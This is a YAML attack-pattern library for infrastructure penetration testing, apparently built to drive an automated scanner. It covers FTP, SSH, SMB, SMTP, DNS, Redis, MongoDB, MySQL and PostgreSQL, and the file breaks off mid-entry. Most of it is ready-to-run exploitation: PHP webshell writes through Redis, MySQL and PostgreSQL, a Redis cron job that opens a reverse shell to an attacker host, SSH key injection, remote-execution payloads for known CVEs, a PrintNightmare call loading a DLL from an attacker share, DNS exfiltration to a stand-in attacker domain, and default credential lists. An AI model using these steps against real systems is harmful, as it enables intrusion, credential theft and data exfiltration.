id: protocol-network-attacks
name: Network Protocol Attack Patterns
version: "1.0"
category: protocols
tags: [ftp, ssh, smb, smtp, dns, redis, mongodb, mysql, postgresql, ldap, snmp, network, protocol, exploitation]
last_updated: "2026-03-26"
description: >
  Comprehensive attack patterns for common network protocols encountered during
  infrastructure penetration testing. Each protocol section includes enumeration
  techniques, exploitation steps, known CVEs with version ranges, and post-exploitation
  guidance. Designed for use by the service_prober scanner and recon composite tool.

protocols:

  # ---------------------------------------------------------------------------
  # FTP - File Transfer Protocol (Port 21)
  # ---------------------------------------------------------------------------
  ftp:
    port: 21
    name: File Transfer Protocol
    description: >
      FTP transmits credentials in cleartext and often permits anonymous access.
      Writable FTP servers can be leveraged for webshell upload when the FTP root
      overlaps with a web root.

    enumeration:
      banner_grab:
        command: "nc -nv {target} 21"
        description: "Grab FTP banner to identify software and version"
      nmap_scripts:
        - "nmap -sV -p 21 --script=ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor {target}"

    attacks:
      anonymous_login:
        description: "Test for anonymous FTP access"
        steps:
          - command: "ftp {target}"
          - input: "USER anonymous"
          - input: "PASS anonymous@"
          - input: "LIST"
          - input: "PWD"
        success_indicators:
          - "230 Login successful"
          - "230 Anonymous access granted"
        risk: medium
        cwe: CWE-287

      directory_listing:
        description: "Enumerate accessible directories and files after anonymous login"
        steps:
          - input: "LIST -la"
          - input: "cd /"
          - input: "LIST -la"
        look_for:
          - "Configuration files (.conf, .cfg, .ini, .xml)"
          - "Backup files (.bak, .sql, .tar.gz, .zip)"
          - "Credential files (.htpasswd, shadow, passwd)"
          - "Web content (.php, .asp, .jsp, .html)"

      file_download:
        description: "Download sensitive files found during enumeration"
        steps:
          - input: "BINARY"
          - input: "GET {filename}"
        priority_files:
          - ".htpasswd"
          - "web.config"
          - "wp-config.php"
          - "*.sql"
          - "*.bak"
          - "id_rsa"

      writable_directory:
        description: "Check if FTP allows file upload for webshell deployment"
        steps:
          - input: "PUT test.txt"
          - input: "LIST"
        success_indicators:
          - "226 Transfer complete"
          - "150 Opening BINARY mode"
        post_exploitation: >
          If FTP root overlaps web root, upload a webshell (e.g., cmd.php) and
          access via browser: http://{target}/cmd.php?c=id

      ftp_bounce:
        description: "FTP bounce attack to port-scan internal hosts through the FTP server"
        steps:
          - command: "nmap -Pn -b anonymous@{target} {internal_target}"
        cwe: CWE-441
        risk: medium

    known_cves:
      - cve_id: CVE-2015-3306
        service: ProFTPD
        version_range: "1.3.5 with mod_copy enabled"
        cvss: 10.0
        summary: "mod_copy allows unauthenticated SITE CPFR/CPTO to copy files anywhere on filesystem"
        exploit_available: public
        exploit_steps:
          - "nc {target} 21"
          - "SITE CPFR /etc/passwd"
          - "SITE CPTO /var/www/html/passwd.txt"
          - "Access http://{target}/passwd.txt"

      - cve_id: CVE-2011-2523
        service: vsftpd
        version_range: "2.3.4"
        cvss: 10.0
        summary: "Backdoor in vsftpd 2.3.4 - username ending in :) opens shell on port 6200"
        exploit_available: public
        exploit_steps:
          - "nc {target} 21"
          - "USER user:)"
          - "PASS pass"
          - "nc {target} 6200"

      - cve_id: CVE-2019-12815
        service: ProFTPD
        version_range: "<= 1.3.5b"
        cvss: 9.8
        summary: "Arbitrary file copy via mod_copy without authentication"
        exploit_available: public

      - cve_id: CVE-2010-4221
        service: ProFTPD
        version_range: "1.3.3c and earlier"
        cvss: 10.0
        summary: "Stack-based buffer overflow in pr_netio_telnet_gets allowing remote code execution"
        exploit_available: public

  # ---------------------------------------------------------------------------
  # SSH - Secure Shell (Port 22)
  # ---------------------------------------------------------------------------
  ssh:
    port: 22
    name: Secure Shell
    description: >
      SSH provides encrypted remote access. Attacks target weak algorithms,
      user enumeration, key-based auth misconfigurations, and version-specific
      CVEs. SSH tunneling is critical for pivoting during post-exploitation.

    enumeration:
      banner_grab:
        command: "nc -nv {target} 22"
        description: "Grab SSH banner to identify OpenSSH/Dropbear version"
      nmap_scripts:
        - "nmap -sV -p 22 --script=ssh2-enum-algos,ssh-hostkey,ssh-auth-methods {target}"
      audit_tool:
        command: "ssh-audit {target}"
        description: "Comprehensive SSH configuration audit including algorithms and vulnerabilities"

    attacks:
      weak_algorithm_detection:
        description: "Identify deprecated or weak cryptographic algorithms"
        weak_kex_algorithms:
          - "diffie-hellman-group1-sha1"
          - "diffie-hellman-group14-sha1"
          - "diffie-hellman-group-exchange-sha1"
          - "ecdh-sha2-nistp256"
        weak_ciphers:
          - "arcfour"
          - "arcfour128"
          - "arcfour256"
          - "3des-cbc"
          - "aes128-cbc"
          - "aes192-cbc"
          - "aes256-cbc"
          - "blowfish-cbc"
          - "cast128-cbc"
        weak_macs:
          - "hmac-md5"
          - "hmac-md5-96"
          - "hmac-sha1-96"
          - "umac-64@openssh.com"
        risk: medium
        cwe: CWE-327

      user_enumeration:
        description: "Enumerate valid usernames via timing or response differences"
        technique: "Send crafted SSH packets to trigger different response times for valid vs invalid users"
        cve: CVE-2018-15473
        affected: "OpenSSH < 7.7"
        tools:
          - "python3 ssh_user_enum.py --userlist users.txt {target}"
          - "auxiliary/scanner/ssh/ssh_enumusers (Metasploit)"
        risk: medium
        cwe: CWE-203

      auth_method_enumeration:
        description: "Determine accepted authentication methods"
        command: "ssh -o PreferredAuthentications=none -o PubkeyAuthentication=no {target}"
        methods_to_detect:
          - "password"
          - "publickey"
          - "keyboard-interactive"
          - "gssapi-with-mic"
          - "hostbased"
        risk: low

      key_type_detection:
        description: "Identify SSH key types in use and check for weak keys"
        look_for:
          - "DSA keys (deprecated, 1024-bit max)"
          - "RSA keys < 2048 bits"
          - "ECDSA keys (potential PRNG issues)"
          - "Known Debian weak keys (CVE-2008-0166)"
        key_files_to_check:
          - "/home/*/.ssh/authorized_keys"
          - "/home/*/.ssh/id_rsa"
          - "/root/.ssh/authorized_keys"
          - "/etc/ssh/ssh_host_*_key.pub"

      ssh_tunneling:
        description: "Use SSH for pivoting to internal networks after credential compromise"
        techniques:
          local_forward: "ssh -L {local_port}:{internal_target}:{remote_port} user@{target}"
          remote_forward: "ssh -R {remote_port}:localhost:{local_port} user@{target}"
          dynamic_socks: "ssh -D 1080 user@{target}"
          proxychains: "Configure /etc/proxychains.conf with socks5 127.0.0.1 1080"

    known_cves:
      - cve_id: CVE-2024-6387
        service: OpenSSH
        version_range: "8.5p1 - 9.7p1"
        cvss: 8.1
        summary: "regreSSHion - signal handler race condition allowing unauthenticated RCE on glibc-based Linux (32-bit proven, 64-bit theoretical)"
        exploit_available: poc
        note: "Regression of CVE-2006-5051. Requires ~10,000 connections over several hours."

      - cve_id: CVE-2023-38408
        service: OpenSSH
        version_range: "8.2p1 - 9.3p1"
        cvss: 9.8
        summary: "PKCS#11 provider remote code execution via ssh-agent forwarding"
        exploit_available: poc
        prerequisite: "Agent forwarding must be enabled and attacker controls remote server"

      - cve_id: CVE-2020-15778
        service: OpenSSH
        version_range: "< 9.0"
        cvss: 7.8
        summary: "Command injection via scp filename when using remote-to-remote copy"
        exploit_available: public

      - cve_id: CVE-2018-15473
        service: OpenSSH
        version_range: "< 7.7"
        cvss: 5.3
        summary: "User enumeration via malformed authentication request timing differences"
        exploit_available: public

      - cve_id: CVE-2016-6515
        service: OpenSSH
        version_range: "< 7.3"
        cvss: 7.5
        summary: "Password length DoS - no limit on password length causes CPU exhaustion"
        exploit_available: public
        exploit_steps:
          - "Send extremely long password (e.g., 100KB) to cause CPU-intensive bcrypt hashing"

      - cve_id: CVE-2016-0778
        service: OpenSSH
        version_range: "5.4 - 7.1p1"
        cvss: 8.1
        summary: "Roaming buffer overflow in client allows private key disclosure"
        exploit_available: poc

  # ---------------------------------------------------------------------------
  # SMB - Server Message Block (Port 445/139)
  # ---------------------------------------------------------------------------
  smb:
    ports: [445, 139]
    name: Server Message Block
    description: >
      SMB is the primary file-sharing protocol on Windows networks. Null sessions,
      unpatched hosts, and misconfigured shares are extremely common in enterprise
      environments. SMB vulnerabilities have produced some of the most devastating
      exploits in history (EternalBlue, WannaCry).

    enumeration:
      null_session:
        commands:
          - "rpcclient -U '' -N {target}"
          - "smbclient -N -L //{target}"
          - "enum4linux -a {target}"
          - "crackmapexec smb {target} -u '' -p '' --shares"
        description: "Attempt unauthenticated access to enumerate shares, users, and domain info"

      share_listing:
        commands:
          - "smbclient -N -L //{target}"
          - "smbmap -H {target}"
          - "smbmap -H {target} -u '' -p ''"
          - "crackmapexec smb {target} --shares"
        look_for:
          - "Writable shares (WRITE permission)"
          - "ADMIN$ and C$ shares (indicates admin access)"
          - "IPC$ share (null session indicator)"
          - "SYSVOL and NETLOGON (domain controller)"
          - "Non-default shares with sensitive names"

      nmap_scripts:
        - "nmap -p 445 --script=smb-enum-shares,smb-enum-users,smb-os-discovery,smb-vuln* {target}"

    attacks:
      user_enumeration_rid_cycling:
        description: "Enumerate domain users by cycling through RIDs via null session"
        commands:
          - "rpcclient -U '' -N {target} -c 'enumdomusers'"
          - "rpcclient -U '' -N {target} -c 'lookupnames administrator'"
          - "crackmapexec smb {target} -u '' -p '' --rid-brute"
          - "lookupsid.py ''@{target}"
        risk: medium
        cwe: CWE-200

      smb_signing_disabled:
        description: "Detect disabled SMB signing for relay attack potential"
        commands:
          - "crackmapexec smb {target} --gen-relay-list relay.txt"
          - "nmap -p 445 --script=smb2-security-mode {target}"
        success_indicators:
          - "signing:False"
          - "Message signing enabled but not required"
        risk: high
        cwe: CWE-345
        post_exploitation: "Use ntlmrelayx.py or Responder for credential relay"

      share_access:
        description: "Access readable/writable shares and extract sensitive data"
        commands:
          - "smbclient //{target}/{share} -N"
          - "smbget -R smb://{target}/{share}/"
        priority_files:
          - "*.conf, *.config, *.xml, *.ini"
          - "*.bat, *.ps1, *.vbs (scripts with creds)"
          - "*.kdbx (KeePass databases)"
          - "unattend.xml, sysprep.xml"
          - "Groups.xml (GPP passwords)"
          - "web.config, wp-config.php"

    known_cves:
      - cve_id: CVE-2017-0144
        service: SMB
        version_range: "Windows SMBv1 (XP through Server 2008 R2)"
        cvss: 9.8
        summary: "EternalBlue - Remote code execution via SMBv1 buffer overflow. Used by WannaCry and NotPetya."
        exploit_available: public
        ms_bulletin: MS17-010
        exploit_steps:
          - "nmap -p 445 --script=smb-vuln-ms17-010 {target}"
          - "use exploit/windows/smb/ms17_010_eternalblue (Metasploit)"

      - cve_id: CVE-2020-0796
        service: SMB
        version_range: "Windows 10 v1903/v1909, Server v1903/v1909"
        cvss: 10.0
        summary: "SMBGhost - Integer overflow in SMBv3.1.1 compression allowing unauthenticated RCE"
        exploit_available: public
        exploit_steps:
          - "nmap -p 445 --script=smb-vuln-cve-2020-0796 {target}"

      - cve_id: CVE-2021-34527
        service: Windows Print Spooler
        version_range: "All Windows versions with Print Spooler enabled"
        cvss: 8.8
        summary: "PrintNightmare - Remote code execution via Windows Print Spooler allowing DLL loading"
        exploit_available: public
        prerequisite: "Valid domain credentials (low privilege)"
        exploit_steps:
          - "rpcdump.py @{target} | grep MS-RPRN"
          - "python3 CVE-2021-34527.py {domain}/{user}:{pass}@{target} '\\\\attacker\\share\\evil.dll'"

      - cve_id: CVE-2021-1675
        service: Windows Print Spooler
        version_range: "All Windows versions"
        cvss: 8.8
        summary: "PrintNightmare variant - Local privilege escalation to SYSTEM via Print Spooler"
        exploit_available: public

      - cve_id: CVE-2019-0708
        service: Remote Desktop Services
        version_range: "Windows XP, 7, Server 2003, 2008, 2008 R2"
        cvss: 9.8
        summary: "BlueKeep - Pre-authentication RCE in Remote Desktop Services (not SMB but often co-located)"
        exploit_available: public
        note: "Wormable. Check during SMB enumeration as hosts often expose both."

      - cve_id: CVE-2020-1472
        service: Netlogon (Active Directory)
        version_range: "All Windows Server versions"
        cvss: 10.0
        summary: "Zerologon - Unauthenticated domain controller compromise via Netlogon crypto flaw"
        exploit_available: public
        exploit_steps:
          - "python3 zerologon_tester.py {dc_name} {dc_ip}"
          - "secretsdump.py -no-pass -just-dc {domain}/{dc_name}$@{dc_ip}"

  # ---------------------------------------------------------------------------
  # SMTP - Simple Mail Transfer Protocol (Port 25/587)
  # ---------------------------------------------------------------------------
  smtp:
    ports: [25, 587, 465]
    name: Simple Mail Transfer Protocol
    description: >
      SMTP servers can leak user information via VRFY/EXPN commands, allow spam
      relay via open relay misconfiguration, and may be vulnerable to RCE in
      specific MTA versions.

    enumeration:
      banner_grab:
        command: "nc -nv {target} 25"
        description: "Grab SMTP banner to identify MTA software and version"
      nmap_scripts:
        - "nmap -sV -p 25,587,465 --script=smtp-commands,smtp-enum-users,smtp-open-relay,smtp-vuln* {target}"

    attacks:
      open_relay:
        description: "Test if SMTP server allows relaying to external domains"
        steps:
          - command: "telnet {target} 25"
          - input: "EHLO test.com"
          - input: "MAIL FROM:<test@test.com>"
          - input: "RCPT TO:<test@external-domain.com>"
          - input: "DATA"
          - input: "Subject: Relay Test"
          - input: "This is a relay test."
          - input: "."
        success_indicators:
          - "250 OK"
          - "250 2.1.5 OK"
        failure_indicators:
          - "550 Relaying denied"
          - "554 Relay access denied"
        risk: high
        cwe: CWE-284

      user_enumeration_vrfy:
        description: "Enumerate valid users via VRFY command"
        steps:
          - input: "VRFY root"
          - input: "VRFY admin"
          - input: "VRFY postmaster"
        success_indicators:
          - "250"
          - "252"
        failure_indicators:
          - "550 No such user"
          - "502 VRFY command disabled"
        risk: medium
        cwe: CWE-203

      user_enumeration_expn:
        description: "Enumerate mailing list members via EXPN command"
        steps:
          - input: "EXPN all"
          - input: "EXPN staff"
          - input: "EXPN admin"
        risk: medium
        cwe: CWE-203

      user_enumeration_rcpt:
        description: "Enumerate valid users via RCPT TO response differences"
        steps:
          - input: "MAIL FROM:<test@test.com>"
          - input: "RCPT TO:<{username}@{target_domain}>"
        success_indicators:
          - "250 OK"
        failure_indicators:
          - "550 Unknown user"
          - "550 No such user"
          - "553 Mailbox not found"
        risk: medium
        cwe: CWE-203

      auth_bruteforce:
        description: "Brute-force SMTP AUTH credentials on port 587"
        steps:
          - "Connect to port 587 with STARTTLS"
          - "EHLO test.com"
          - "AUTH LOGIN (base64-encoded credentials)"
        tools:
          - "hydra -l {user} -P {wordlist} {target} smtp"
        risk: medium
        cwe: CWE-307

      header_injection:
        description: "Test for SMTP header injection via web application email forms"
        payloads:
          - "victim@test.com%0ACc:attacker@evil.com"
          - "victim@test.com\\r\\nBcc:attacker@evil.com"
          - "victim@test.com%0d%0aSubject:Injected"
        risk: medium
        cwe: CWE-93

    known_cves:
      - cve_id: CVE-2019-10149
        service: Exim
        version_range: "4.87 - 4.91"
        cvss: 9.8
        summary: "Remote command execution via crafted recipient address - 'Return of the WIZard'"
        exploit_available: public
        exploit_steps:
          - "MAIL FROM:<>"
          - "RCPT TO:<${run{\\x2Fbin\\x2Fsh\\x09-c\\x09\\x22id\\x22}}@localhost>"

      - cve_id: CVE-2020-28018
        service: Exim
        version_range: "4.92 - 4.93.0.4"
        cvss: 9.8
        summary: "Use-after-free in TLS handling allowing unauthenticated RCE"
        exploit_available: poc

      - cve_id: CVE-2017-7692
        service: Squirrelmail
        version_range: "<= 1.4.22"
        cvss: 8.8
        summary: "Remote code execution via crafted sendmail.cf during encoding conversion"
        exploit_available: public

      - cve_id: CVE-2014-3566
        service: SMTP (any with SSLv3)
        version_range: "SSLv3 enabled"
        cvss: 3.4
        summary: "POODLE - SSLv3 padding oracle allows plaintext recovery of encrypted traffic"
        exploit_available: public

  # ---------------------------------------------------------------------------
  # DNS - Domain Name System (Port 53)
  # ---------------------------------------------------------------------------
  dns:
    port: 53
    name: Domain Name System
    description: >
      DNS misconfigurations can leak the entire zone, enable subdomain takeover,
      and serve as a data exfiltration channel. Zone transfers are the single
      most impactful DNS misconfiguration.

    enumeration:
      identify_nameservers:
        commands:
          - "dig NS {domain}"
          - "host -t NS {domain}"
        description: "Find authoritative nameservers for the target domain"
      nmap_scripts:
        - "nmap -sU -p 53 --script=dns-zone-transfer,dns-cache-snoop,dns-recursion {target}"

    attacks:
      zone_transfer:
        description: "Attempt DNS zone transfer to dump all records"
        commands:
          - "dig axfr @{nameserver} {domain}"
          - "host -l {domain} {nameserver}"
          - "dnsrecon -d {domain} -t axfr"
        success_indicators:
          - "XFR size:"
          - Multiple A/CNAME/MX records returned
        risk: high
        cwe: CWE-200

      subdomain_takeover:
        description: "Detect dangling CNAME records pointing to unclaimed services"
        steps:
          - "Enumerate subdomains: subfinder -d {domain} / amass enum -d {domain}"
          - "Resolve all subdomains and check for NXDOMAIN on CNAME targets"
          - "Check if CNAME target is a claimable service (S3, Azure, GitHub Pages, Heroku, etc.)"
        indicators:
          - "NXDOMAIN response for CNAME target"
          - "NoSuchBucket (AWS S3)"
          - "There isn't a GitHub Pages site here"
          - "No such app (Heroku)"
          - "Repository not found (Bitbucket)"
          - "The specified blob does not exist (Azure)"
        risk: high
        cwe: CWE-284

      dns_cache_poisoning:
        description: "Test for DNS cache poisoning susceptibility"
        checks:
          - "Source port randomization: dig +short porttest.dns-oarc.net TXT @{resolver}"
          - "TXID randomization: check if transaction IDs are predictable"
          - "0x20 encoding: check if resolver uses case randomization"
        risk: high
        cwe: CWE-350

      dnssec_misconfiguration:
        description: "Check DNSSEC deployment and validation issues"
        commands:
          - "dig DNSKEY {domain} +dnssec"
          - "dig DS {domain}"
          - "delv @{resolver} {domain}"
        checks:
          - "Missing DNSSEC entirely"
          - "DNSSEC signed but DS record missing at parent"
          - "Expired RRSIG signatures"
          - "NSEC vs NSEC3 (NSEC allows zone walking)"
        risk: medium

      dns_exfiltration:
        description: "Test if DNS can be used for data exfiltration (outbound channel)"
        technique: "Encode data in subdomain labels: {base64data}.exfil.attacker.com"
        tools:
          - "dnscat2"
          - "iodine"
        risk: high

    known_cves:
      - cve_id: CVE-2020-1350
        service: Windows DNS Server
        version_range: "All Windows Server versions"
        cvss: 10.0
        summary: "SigRed - Wormable RCE in Windows DNS Server via crafted SIG record"
        exploit_available: poc

      - cve_id: CVE-2023-50387
        service: BIND / any DNSSEC-validating resolver
        version_range: "All DNSSEC-validating resolvers"
        cvss: 7.5
        summary: "KeyTrap - DNSSEC validation DoS via crafted DNSKEY records"
        exploit_available: poc

      - cve_id: CVE-2021-25216
        service: BIND
        version_range: "9.5.0 - 9.11.35, 9.12.0 - 9.16.21, 9.17.0 - 9.17.18"
        cvss: 9.8
        summary: "Buffer overflow in BIND GSS-TSIG handling allowing RCE"
        exploit_available: poc

  # ---------------------------------------------------------------------------
  # Redis (Port 6379)
  # ---------------------------------------------------------------------------
  redis:
    port: 6379
    name: Redis In-Memory Data Store
    description: >
      Redis is frequently deployed without authentication on internal networks.
      Unauthenticated access enables data theft, file write for RCE (webshell,
      SSH key injection), and module loading for direct command execution.

    enumeration:
      connect_test:
        commands:
          - "redis-cli -h {target} PING"
          - "redis-cli -h {target} INFO server"
        description: "Test for unauthenticated access"
      nmap_scripts:
        - "nmap -sV -p 6379 --script=redis-info {target}"

    attacks:
      unauthenticated_access:
        description: "Access Redis without credentials and enumerate data"
        steps:
          - command: "redis-cli -h {target}"
          - input: "INFO"
          - input: "CONFIG GET *"
          - input: "KEYS *"
          - input: "DBSIZE"
          - input: "SELECT 0"
          - input: "KEYS *"
        success_indicators:
          - "redis_version:"
          - "connected_clients:"
        risk: critical
        cwe: CWE-287

      webshell_via_file_write:
        description: "Write a webshell to the web root via Redis CONFIG SET"
        steps:
          - input: "CONFIG SET dir /var/www/html"
          - input: "CONFIG SET dbfilename shell.php"
          - input: "SET payload \"<?php system($_GET['c']);?>\""
          - input: "SAVE"
          - verify: "curl http://{target}/shell.php?c=id"
        risk: critical
        cwe: CWE-94
        prerequisites:
          - "Redis running as user with write access to web root"
          - "Known web root path"

      ssh_key_injection:
        description: "Write attacker SSH public key to authorized_keys via Redis"
        steps:
          - "Generate key: ssh-keygen -t ed25519 -f redis_rsa"
          - "Pad key: (echo -e '\\n\\n'; cat redis_rsa.pub; echo -e '\\n\\n') > key.txt"
          - input: "CONFIG SET dir /root/.ssh"
          - input: "CONFIG SET dbfilename authorized_keys"
          - input: "SET sshkey \"\\n\\n<public_key_content>\\n\\n\""
          - input: "SAVE"
          - "ssh -i redis_rsa root@{target}"
        risk: critical
        cwe: CWE-94

      cron_job_injection:
        description: "Write a reverse shell cron job via Redis"
        steps:
          - input: "CONFIG SET dir /var/spool/cron/crontabs"
          - input: "CONFIG SET dbfilename root"
          - input: "SET cron \"\\n\\n* * * * * /bin/bash -c 'bash -i >& /dev/tcp/{attacker}/4444 0>&1'\\n\\n\""
          - input: "SAVE"
        risk: critical
        cwe: CWE-94
        note: "Works on Debian/Ubuntu. Use /var/spool/cron/ on CentOS/RHEL."

      module_load_rce:
        description: "Load a malicious Redis module for direct command execution"
        steps:
          - "Compile redis-rogue-server or RedisModules-ExecuteCommand"
          - input: "MODULE LOAD /path/to/module.so"
          - input: "system.exec 'id'"
        risk: critical
        cwe: CWE-94
        prerequisite: "Ability to upload .so file to target or accessible share"

    known_cves:
      - cve_id: CVE-2022-0543
        service: Redis
        version_range: "Debian/Ubuntu packages through 6.2.6"
        cvss: 10.0
        summary: "Lua sandbox escape via package library allowing OS command execution"
        exploit_available: public
        exploit_steps:
          - "redis-cli -h {target}"
          - "EVAL \"local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io'); local io = io_l(); local f = io.popen('id', 'r'); local res = f:read('*a'); f:close(); return res\" 0"

      - cve_id: CVE-2015-4335
        service: Redis
        version_range: "< 2.8.21, < 3.0.2"
        cvss: 10.0
        summary: "Lua sandbox escape allowing arbitrary code execution"
        exploit_available: public

      - cve_id: CVE-2023-28856
        service: Redis
        version_range: "< 6.2.12, < 7.0.11"
        cvss: 6.5
        summary: "Authenticated remote code execution via specially crafted HINCRBYFLOAT command"
        exploit_available: poc

  # ---------------------------------------------------------------------------
  # MongoDB (Port 27017)
  # ---------------------------------------------------------------------------
  mongodb:
    port: 27017
    name: MongoDB NoSQL Database
    description: >
      MongoDB historically shipped without authentication enabled. Exposed instances
      allow full database enumeration, data exfiltration, and in some cases RCE.
      Internet-exposed MongoDB is one of the most common sources of data breaches.

    enumeration:
      connect_test:
        commands:
          - "mongosh --host {target} --eval 'db.adminCommand({listDatabases:1})'"
          - "nmap -sV -p 27017 --script=mongodb-info,mongodb-databases {target}"
        description: "Test for unauthenticated access and list databases"

    attacks:
      unauthenticated_access:
        description: "Connect to MongoDB without credentials and enumerate data"
        steps:
          - command: "mongosh --host {target}"
          - input: "show dbs"
          - input: "use admin"
          - input: "show collections"
          - input: "db.system.users.find().pretty()"
          - input: "use {target_db}"
          - input: "show collections"
          - input: "db.{collection}.find().limit(10).pretty()"
        success_indicators:
          - Database listing returned
          - "admin, local, config databases visible"
        risk: critical
        cwe: CWE-287

      credential_extraction:
        description: "Extract user credentials from admin database"
        commands:
          - input: "use admin"
          - input: "db.system.users.find().pretty()"
          - input: "db.system.users.find({}, {user:1, roles:1, credentials:1})"
        look_for:
          - "SCRAM-SHA-256 credential hashes"
          - "SCRAM-SHA-1 credential hashes"
          - "Users with root or dbAdminAnyDatabase roles"
        risk: critical
        cwe: CWE-522

      data_exfiltration:
        description: "Systematically extract sensitive data from all databases"
        steps:
          - "List all databases: show dbs"
          - "For each database, list collections: show collections"
          - "Identify sensitive collections (users, accounts, payments, tokens, sessions)"
          - "Extract records: db.{collection}.find().limit(1000)"
          - "Export: mongoexport --host {target} --db {db} --collection {col} --out data.json"
        risk: critical
        cwe: CWE-200

    known_cves:
      - cve_id: CVE-2017-2462
        service: MongoDB
        version_range: "< 3.4.2, < 3.2.12"
        cvss: 7.5
        summary: "Unauthorized data access via crafted BSON messages"
        exploit_available: poc

      - cve_id: CVE-2015-7882
        service: MongoDB
        version_range: "2.4.x, 2.6.x before 2.6.11, 3.0.x before 3.0.7"
        cvss: 6.8
        summary: "Authentication bypass when using LDAP backend"
        exploit_available: poc

      - cve_id: default-unauth
        service: MongoDB
        version_range: "< 3.6 (default config)"
        cvss: 10.0
        summary: "Default installation listens on all interfaces without authentication until version 3.6"
        exploit_available: public
        note: "Not a CVE but the most commonly exploited MongoDB misconfiguration"

  # ---------------------------------------------------------------------------
  # MySQL (Port 3306)
  # ---------------------------------------------------------------------------
  mysql:
    port: 3306
    name: MySQL Database
    description: >
      MySQL databases may permit anonymous access, have weak root credentials,
      or contain version-specific vulnerabilities. Post-authentication, UDF and
      file operations can lead to full system compromise.

    enumeration:
      banner_grab:
        command: "nc -nv {target} 3306"
        description: "Grab MySQL banner for version identification"
      nmap_scripts:
        - "nmap -sV -p 3306 --script=mysql-info,mysql-enum,mysql-vuln* {target}"

    attacks:
      anonymous_login:
        description: "Test for anonymous or passwordless root access"
        commands:
          - "mysql -h {target} -u root"
          - "mysql -h {target} -u root -p ''"
          - "mysql -h {target} -u anonymous"
        success_indicators:
          - "Welcome to the MySQL monitor"
        risk: critical
        cwe: CWE-287

      udf_rce:
        description: "Gain RCE via User Defined Functions after authentication"
        steps:
          - "Determine plugin directory: SELECT @@plugin_dir;"
          - "Upload UDF library to plugin directory"
          - "CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';"
          - "SELECT sys_exec('id');"
        risk: critical
        cwe: CWE-94
        prerequisite: "FILE privilege and INSERT into mysql.func"

      file_read_write:
        description: "Read and write files via MySQL FILE privilege"
        read: "SELECT LOAD_FILE('/etc/passwd');"
        write: "SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/html/shell.php';"
        check_privilege: "SELECT file_priv FROM mysql.user WHERE user=CURRENT_USER();"
        risk: critical
        cwe: CWE-22

      privilege_escalation:
        description: "Escalate from limited MySQL user to root/admin"
        techniques:
          - "SELECT user, host, authentication_string FROM mysql.user;"
          - "GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%' IDENTIFIED BY 'password';"
          - "Check for SUPER privilege: SHOW GRANTS FOR CURRENT_USER();"

    known_cves:
      - cve_id: CVE-2012-2122
        service: MySQL
        version_range: "5.1.x, 5.5.x, 5.6.x, MariaDB 5.1-5.3"
        cvss: 7.5
        summary: "Authentication bypass - memcmp timing flaw allows login with wrong password (~1 in 256 chance per attempt)"
        exploit_available: public
        exploit_steps:
          - "for i in $(seq 1 1000); do mysql -h {target} -u root --password=bad -e 'SELECT 1' 2>/dev/null && break; done"

      - cve_id: CVE-2016-6662
        service: MySQL
        version_range: "5.5.x, 5.6.x, 5.7.x"
        cvss: 9.8
        summary: "Remote root code execution via malicious my.cnf and shared library injection"
        exploit_available: poc

      - cve_id: CVE-2016-6663
        service: MySQL
        version_range: "5.5.x, 5.6.x, 5.7.x"
        cvss: 7.0
        summary: "Privilege escalation from mysql user to root via race condition in CREATE TABLE"
        exploit_available: poc

      - cve_id: CVE-2024-21096
        service: MySQL
        version_range: "8.0.x before 8.0.37, 8.3.x before 8.3.0"
        cvss: 4.9
        summary: "mysqldump command injection via crafted database metadata"
        exploit_available: poc

  # ---------------------------------------------------------------------------
  # PostgreSQL (Port 5432)
  # ---------------------------------------------------------------------------
  postgresql:
    port: 5432
    name: PostgreSQL Database
    description: >
      PostgreSQL provides powerful built-in functions for file I/O and command
      execution. Default trust authentication or weak credentials combined with
      COPY FROM PROGRAM can yield immediate RCE.

    enumeration:
      connect_test:
        commands:
          - "psql -h {target} -U postgres -c 'SELECT version();'"
          - "nmap -sV -p 5432 --script=pgsql-brute {target}"
        description: "Test default credentials and identify version"

    attacks:
      default_credentials:
        description: "Test common PostgreSQL credentials"
        credentials:
          - {username: "postgres", password: "postgres"}
          - {username: "postgres", password: "password"}
          - {username: "postgres", password: "admin"}
          - {username: "postgres", password: ""}
          - {username: "admin", password: "admin"}
        risk: critical
        cwe: CWE-287

      file_read:
        description: "Read arbitrary files via PostgreSQL functions"
        commands:
          - "SELECT pg_read_file('/etc/passwd');"
          - "SELECT pg_read_file('/etc/shadow');"
          - "SELECT pg_read_binary_file('/etc/passwd');"
          - "COPY (SELECT '') TO '/tmp/test';"
          - "CREATE TABLE temp(data text); COPY temp FROM '/etc/passwd'; SELECT * FROM temp;"
        risk: critical
        cwe: CWE-22

      file_write:
        description: "Write arbitrary files via COPY TO"
        commands:
          - "COPY (SELECT '<?php system($_GET[c]); ?>') TO '/var/www/html/shell.php';"
        risk: critical
        cwe: CWE-94

      rce_copy_program:
        description: "Execute OS commands via COPY FROM PROGRAM (PostgreSQL 9.3+)"
        commands:
          - "CREATE TABLE cmd_output(line text);"
          - "COPY cmd_output FROM PROGRAM 'id';"
          - "SELECT * FROM cmd_output;"
          - "COPY cmd_output FROM PROGRAM 'cat /etc/passwd';"
        risk: critical
        cwe: CWE-78
        prerequisite: "Superuser or pg_execute_server_program role"

      large_object_abuse:
        description: "Read/write files via large object functions"
        steps:
          - "SELECT lo_import('/etc/passwd');"
          - "SELECT lo_get({oid});"
          - "SELECT lo_export({oid}, '/tmp/output');"
        risk: critical
        cwe: CWE-22

    known_cves:
      - cve_id: CVE-2019-9193
        service: PostgreSQL
        version_range: "9.3+"
        cvss: 9.8
        summary: "COPY FROM PROGRAM allows authenticated superuser to execute arbitrary OS commands"
        exploit_available: public
        note: "Considered a feature by PostgreSQL team, but frequently exploited"

      - cve_id: CVE-2023-5868
        service: PostgreSQL
        version_range: "< 16.1, < 15.5, < 14.10, < 13.13, < 12.17"
        cvss: 4.3
        summary: "Memory disclosure in aggregate function calls"
        exploit_available: poc

      - cve_id: CVE-2023-5869
        service: PostgreSQL
        version_range: "< 16.1, < 15.5, < 14.10, < 13.13, < 12.17"
        cvss: 8.8
        summary: "Buffer overflow in integer overflow handling allowing RCE"
        exploit_available: poc

      - cve_id: CVE-2024-10979
        service: PostgreSQL
        version_range: "< 17.1, < 16.5, < 15.9, < 14.14, < 13.17"
